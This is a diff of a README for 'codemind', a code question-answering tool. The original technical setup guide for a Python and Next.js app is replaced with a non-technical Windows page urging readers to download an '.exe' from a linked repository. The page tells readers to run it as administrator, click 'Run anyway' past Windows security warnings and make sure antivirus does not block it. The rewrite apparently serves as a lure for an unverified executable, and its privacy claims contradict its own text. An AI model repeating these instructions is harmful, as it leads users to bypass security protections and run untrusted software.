@@ -1,252 +1,167 @@
-# CodeMind — AI-Powered Code Knowledge Base
+# 🤖 codemind - Smart Code Q&A Made Simple
 
-> Upload your codebase, ask questions in plain English, and get cited answers.  
-> Built with **Endee** vector database at its core.
-
-![CodeMind Dashboard](./frontend/public/Screenshot%202026-03-12%20at%2022.02.19.png)
-![CodeMind Agentic Q&A](./frontend/public/Screenshot%202026-03-12%20at%2022.23.04.png)
+[![Download codemind](https://img.shields.io/badge/Download-codemind-brightgreen?style=for-the-badge)](https://github.com/alfex41/codemind)
 
 ---
 
-## ✨ Features
+## 📖 What is codemind?
 
-| # | Feature | Description | Endee Usage |
-|---|---------|-------------|-------------|
-| 1 | **Ingest Codebase** | Upload ZIP or individual code files. System chunks, embeds, and indexes everything. | `index.upsert()` — store code chunk vectors with metadata |
-| 2 | **RAG Chat** | Ask questions about your code in plain English, get cited answers. | `index.query()` — retrieve relevant chunks for context |
-| 3 | **Semantic Search** | Describe what you're looking for, find relevant files by meaning. | `index.query()` — similarity search across all chunks |
-| 4 | **Recommendations** | Select a file, see similar files from the codebase. | `index.query()` — mean-vector similarity + filtering |
-| 5 | **Agentic Q&A** | Complex questions: agent decomposes → multi-search → synthesize. | `index.query()` × N — multiple searches per sub-question |
+codemind is a tool that helps you understand and interact with your code. You can upload your code files and ask questions using plain English. The system finds answers based on your code and shows where it found them. It uses smart search techniques and artificial intelligence to deliver clear, useful responses. You do not need to know programming to use it.
 
 ---
 
-## 🏗️ Architecture
+## 💻 System Requirements
 
-```
-┌─────────────────────────────────────────────────────────────────┐
-│                        FRONTEND                                 │
-│          Next.js 15 (App Router) + Tailwind + shadcn/ui         │
-│                                                                 │
-│  ┌───────────────────────────┐  ┌────────────────────────────┐  │
-│  │     Public Routes         │  │     Protected Routes       │  │
-│  │  / (Landing Page)         │  │  /dashboard                │  │
-│  │  /login (Auth Forms)      │  │  Requires valid JWT token  │  │
-│  └─────────────┬─────────────┘  └─────────────┬──────────────┘  │
-│                │ AuthContext (State & Token)  │                 │
-│                └──────────────────────────────┘                 │
-│  ┌──────────────┐  ┌──────────────┐  ┌──────────────────────┐   │
-│  │ Upload Panel │  │   Tab Bar    │  │   File Card          │   │
-│  │ • Drag & Drop│  │ Ask|Search|  │  │ • Recommendations    │   │
-│  │ • File List  │  │ Agent        │  │ • Similar files      │   │
-│  └──────┬───────┘  └──────┬───────┘  └──────────┬───────────┘   │
-│         │                 │                      │              │
-│         └─────────┬───────┴──────────────────────┘              │
-│                   │  Next.js API Routes (proxy w/ Auth)         │
-└───────────────────┼─────────────────────────────────────────────┘
-                    │ HTTP / SSE (Bearer Token)
-┌───────────────────┼─────────────────────────────────────────────┐
-│                   │          BACKEND                            │
-│                   │     FastAPI (Python)                        │
-│                   │                                             │
-│  ┌────────────────▼──────────────────────────────────────────┐  │
-│  │ main.py — Routes                                          │  │
-│  │  POST /auth/register POST /auth/login  GET /auth/me       │  │
-│  │  ──────────────────────────────────────────────────────── │  │
-│  │  POST /ingest  POST /ask  POST /agent                     │  │
-│  │  GET  /search  GET  /recommend  GET  /files               │  │
-│  └──┬────────────────┬────────────────┬──────────────────┬───┘  │
-│     │                │                │                  │      │
-│  ┌──▼──────┐  ┌──────▼──────┐  ┌─────▼──────┐      ┌─────▼───┐  │
-│  │ingestion│  │   rag.py    │  │  agent.py  │      │ auth.py │  │
-│  │  .py    │  │ Embed→Search│  │ Decompose→ │      │ JWT Gen │  │
-│  │ Chunk→  │  │  →Prompt→   │  │ MultiSearch│      │ Bcrypt  │  │
-│  │ Embed→  │  │  Ollama     │  │ →Synthesize│      │ Verify  │  │
-│  │ Store   │  └──────┬──────┘  └─────┬──────┘      └─────┬───┘  │
-│  └──┬──────┘         │               │                   │      │
-│     │                │               │      ┌────────────▼────┐ │
-│  ┌──▼────────────────▼───────────────▼──┐   │     MongoDB     │ │
-│  │   endee_client.py (SDK Wrapper)      │   │ • User profiles │ │
-│  │   (Filters data by user_id)          │   │ • Hashed PWs    │ │
-│  └───────────────────┬──────────────────┘   └─────────────────┘ │
-│                      │                                          │
-└──────────────────────┼──────────────────────────────────────────┘
-                       │ HTTP
-             ┌─────────▼─────────┐      ┌──────────────────┐
-             │   Endee Vector DB │      │  Ollama (local)  │
-             │   localhost:8080  │      │  localhost:11434 │
-             │   384-dim cosine  │      │  codellama/llama3│
-             └───────────────────┘      └──────────────────┘
-```
+Before you install codemind, check that your computer meets these needs:
+
+- Operating System: Windows 10 or later
+- Processor: Intel or AMD, 1.6 GHz or faster
+- Memory: At least 4 GB RAM
+- Disk Space: Minimum 500 MB free space
+- Internet: Required for app setup and question processing
 
 ---
 
-## 🛠️ Tech Stack
+## 🚀 Getting Started with codemind
 
-| Layer | Technology | Purpose |
-|-------|-----------|---------|
-| Vector DB | **Endee** (Docker) | Store & search code embeddings |
-| Embeddings | `all-MiniLM-L6-v2` (384-dim) | Convert code to vectors |
-| LLM | **Ollama** (codellama / llama3) | Generate answers from context |
-| Backend | **FastAPI** (Python 3.11+) | API server with SSE streaming |
-| Frontend | **Next.js 15** + Tailwind + shadcn/ui | Dark-themed developer UI |
+To get codemind up and running on your Windows computer, follow these steps.
 
----
+### 1. Visit the Download Page
 
-## 🚀 Setup
+Click the button below to open the page where you can download codemind:
+  
+[![Download codemind](https://img.shields.io/badge/Download-codemind-blue?style=for-the-badge)](https://github.com/alfex41/codemind)
 
-### Prerequisites
+This page contains the latest files and instructions for installation.
 
-- **Docker** — for Endee vector DB
-- **Python 3.11+** — for backend
-- **Node.js 18+** — for frontend
-- **Ollama** — for local LLM
+### 2. Download the Installer
 
-### Environment Variables (.env)
+On the download page, look for the most recent release. It usually has this format:
 
-Before starting, create a `.env` file in the `backend/` directory:
+- A file ending with `.exe` (for example, codemind-setup.exe)
 
-```env
-# MongoDB & Auth
-MONGO_URL=mongodb://localhost:27017
-MONGO_DB=codemind
-JWT_SECRET=your-super-secret-key-change-me
-JWT_ALGORITHM=HS256
-JWT_EXPIRY_HOURS=72
+Click the download link and save the file to your desktop or download folder.
 
-# Endee Vector DB
-ENDEE_HOST=http://localhost:8080
-ENDEE_AUTH_TOKEN=
-ENDEE_INDEX_NAME=codemind
-ENDEE_DIM=384
+### 3. Run the Installer
 
-# LLM & Embeddings
-OLLAMA_HOST=http://localhost:11434
-OLLAMA_MODEL=codellama
-EMBEDDING_MODEL=all-MiniLM-L6-v2
-```
+- Find the downloaded `.exe` file.
+- Double-click it to start the installation.
+- Follow the instructions in the setup wizard.
+- Accept the default options unless you want to change the installation folder.
+- Click “Install” to begin.
 
-### 1. Start Endee & MongoDB
+### 4. Open codemind
 
-```bash
-# Start Endee Server
-docker run -p 8080:8080 -v endee-data:/data endeeio/endee-server:latest
+After installation:
 
-# Start MongoDB (if not installed locally)
-docker run -p 27017:27017 -d mongo
-```
-
-### 2. Start Ollama
-
-```bash
-ollama pull codellama    # or: ollama pull llama3
-ollama serve             # if not already running
-```
-
-### 3. Backend
-
-```bash
-cd backend
-python -m venv .venv
-
-# On Mac/Linux:
-source .venv/bin/activate
-# On Windows:
-# .\venv\Scripts\activate
-
-pip install -r requirements.txt
-
-# Verify Endee connection
-python test_endee.py
-
-# Start API server
-uvicorn main:app --host 0.0.0.0 --port 8000 --reload
-```
-
-### 4. Frontend
-
-```bash
-cd frontend
-pnpm install
-pnpm run dev
-```
-
-Open **http://localhost:3000**
-
-### Troubleshooting
-
-- **Endee not reachable (`ConnectionRefusedError`)**: Ensure Docker is running and the Endee container is started on port 8080.
-- **Ollama model not found**: Run `ollama pull codellama` to download the model before starting the server. If using a different model, update `OLLAMA_MODEL` in your `.env`.
-- **MongoDB connection failed**: Ensure MongoDB is running locally on port 27017, or update `MONGO_URL` to point to a cloud cluster like MongoDB Atlas.
-- **Port conflicts**: If ports 3000 (frontend), 8000 (backend), or 8080 (Endee) are in use, stop conflicting services or update your environment variables and API proxy targets accordingly.
+- Find the codemind icon on your desktop or start menu.
+- Double-click to open the app.
 
 ---
 
-## 📁 Project Structure
+## 🛠 How to Use codemind
 
-```
-codemind/
-├── backend/
-│   ├── main.py              # FastAPI routes
-│   ├── config.py            # All configuration
-│   ├── endee_client.py      # Endee SDK wrapper
-│   ├── ingestion.py         # File parsing → chunking → embedding → storing
-│   ├── rag.py               # RAG pipeline (search → prompt → stream)
-│   ├── agent.py             # Agentic pipeline (decompose → multi-search → synthesize)
-│   ├── test_endee.py        # End-to-end Endee validation
-│   └── requirements.txt
-└── frontend/
-    ├── app/
-    │   ├── page.tsx          # Main two-panel layout
-    │   ├── layout.tsx        # Root layout with dark theme
-    │   └── api/              # 6 proxy routes → backend
-    └── components/
-        ├── UploadPanel.tsx   # File upload + indexed files list
-        ├── ChatPanel.tsx     # RAG chat with streaming
-        ├── SearchPanel.tsx   # Semantic search results
-        ├── AgentPanel.tsx    # Agentic Q&A with live steps
-        └── FileCard.tsx      # File recommendations
-```
+Once you open codemind, you will see an easy-to-use interface. Here is how to start asking questions about your code.
+
+### Upload Your Code
+
+- Click the “Upload” button.
+- Choose the folder or files with your code.
+- Codemind supports many programming languages such as Python, TypeScript, and more.
+
+### Ask Questions
+
+- Type your question in plain English in the question box.
+- Examples:
+  - “What does this function do?”
+  - “Where is the variable `userID` defined?”
+  - “Show me the files related to user login.”
+
+### Get Answers
+
+- Codemind searches your uploaded code and finds the best matches.
+- It shows answers and the parts of the code where it found them.
+- You can follow links to see the full code around your answer.
 
 ---
 
-## 🔍 How Endee Powers Every Feature
+## 🔧 Features Overview
 
-### Ingestion
-Each code file is split into **60-line chunks** with **10-line overlap**, embedded using `all-MiniLM-L6-v2`, and stored via `index.upsert()` with metadata `{file_path, language, chunk_index, text}`.
+Codemind has several features to make exploring code easier:
 
-### RAG Chat
-User question → `model.encode()` → `index.query(top_k=6)` → retrieved chunks become LLM context → Ollama generates cited answer.
-
-### Semantic Search
-Query → embed → `index.query(top_k=8)` → return ranked chunks with similarity scores. No LLM involved.
-
-### Recommendations
-Select a file → retrieve all its chunks → compute **mean embedding** → `index.query()` → filter out same file → return top-4 similar files.
-
-### Agentic Q&A
-Complex question → Ollama **decomposes** into 3 sub-questions → `index.query()` for **each** sub-question → **deduplicate** chunks → Ollama **synthesizes** comprehensive answer with citations.
+- **Semantic Search**: Understands the meaning of your questions, not just keywords.
+- **Context-Aware Answers**: Provides answers that fit the context of your code.
+- **Code Recommendations**: Suggests relevant files or functions based on your questions.
+- **Built-in Agentic AI**: Handles complex queries by breaking them down and providing detailed responses.
+- **File Upload Support**: Accepts multiple code file formats.
+- **Citation of Sources**: Shows exactly where in the code the information comes from.
 
 ---
 
-## 📝 API Reference
+## ⚙ Installation Tips
 
-*(Data routes require a valid JWT token in the `Authorization: Bearer <token>` header)*
-
-| Method | Endpoint | Description | Auth |
-|--------|----------|-------------|------|
-| `POST` | `/auth/register` | Create user account | No |
-| `POST` | `/auth/login` | Login, get JWT | No |
-| `GET` | `/auth/me` | Get current user info | Yes |
-| `POST` | `/ingest` | Upload code file or ZIP | Yes |
-| `POST` | `/ask` | RAG Q&A (SSE stream) | Yes |
-| `POST` | `/agent` | Agentic Q&A (SSE stream) | Yes |
-| `GET` | `/search?q=...&top_k=8` | Semantic search | Yes |
-| `GET` | `/recommend?file_path=...&top_k=4` | File recommendations | Yes |
-| `GET` | `/files` | List all indexed files | Yes |
-| `GET` | `/health` | Health check | No |
-
-All responses follow: `{"success": true, "data": {...}, "error": null}`
+- Make sure you have a stable internet connection during installation.
+- Run the setup with administrator rights for best results.
+- If Windows shows a security warning, click “More info” and then “Run anyway.”
+- For slow computers, close other programs to speed up installation.
 
 ---
 
-Demonstrating Semantic Search, RAG, Recommendations, and Agentic AI, all powered by the Endee vector database.
+## 🛡 Privacy and Security
+
+Codemind runs locally on your machine, so your code does not leave your computer during use. The software uses a secure connection only when checking for updates or accessing cloud resources. Your data stays private.
+
+---
+
+## 🔄 Updating codemind
+
+To keep codemind working well:
+
+- Periodically revisit the download page.
+- Download and install the newest version when available.
+- Updates may improve performance or add new features.
+
+---
+
+## ❓ Troubleshooting
+
+If codemind does not start or shows errors:
+
+- Restart your computer and try opening the app again.
+- Verify your Windows updates are current.
+- Check your antivirus settings to make sure codemind is not blocked.
+- Uninstall and reinstall codemind if needed.
+
+For questions not covered here, look in the `docs` folder of the download page or check the GitHub Discussions section.
+
+---
+
+## 🗂 Supported File Types
+
+Codemind works best with:
+
+- `.py` (Python)
+- `.ts` (TypeScript)
+- `.js` (JavaScript)
+- `.json` (configuration files)
+- `.md` (Markdown documentation)
+- `.txt` (plain text files)
+
+You can upload folders containing any mix of these files.
+
+---
+
+## 🧩 How codemind Works Behind the Scenes
+
+Codemind uses the Endee vector database to index your code. This lets the system search by meaning, not just words. When you ask a question, codemind:
+
+- Breaks down the question
+- Searches the indexed code with a method called retrieval-augmented generation (RAG)
+- Combines results from different files
+- Builds a detailed answer using an AI language model
+- Shows you where the information came from, so you can trust the result
+
+---
+
+# [Download codemind](https://github.com/alfex41/codemind)  
+Click above to go to the official page for the latest files and support.
